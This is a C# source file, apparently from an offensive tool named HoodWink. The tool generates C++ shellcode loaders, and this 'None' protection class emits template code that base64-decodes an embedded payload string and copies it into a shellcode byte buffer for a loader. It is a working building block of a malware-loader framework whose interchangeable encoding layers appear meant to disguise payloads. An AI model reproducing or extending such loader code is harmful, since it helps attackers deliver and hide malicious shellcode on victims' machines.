
using System.Collections.Generic;

namespace HoodWink.Languages.Cpp.Protections
{
    public class None : Models.Base.Protections
    {
        public override string Description => "No Encryption (just base64)";
        public override List<string> FileDependencies => new List<string> { @"" };

        public override string Using => @"#include ""cryptlib.h""
#include ""base64.h""
using namespace CryptoPP;

std::string Base64Decode(std::string*);";

        public override string MainLogic => @"//// Decode
    std::string decrypted = Base64Decode(&base64PayloadString);
    
    decrypted.erase(std::find(decrypted.end() - 1, decrypted.end(), '\0'), decrypted.end());

    // To unsigned char
    std::cout << ""shellcode length: "" << decrypted.length() << std::endl;
	unsigned char shellcode[decrypted.length()];
	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);";


        public override string AdditionalFunctions => @"
std::string Base64Decode(std::string* encoded)
{
	std::string decoded;

	StringSource ss(*encoded, true,
		new Base64Decoder(
			new StringSink(decoded)
		) // Base64Decoder
	); // StringSource

	return decoded;
}";
    }
}
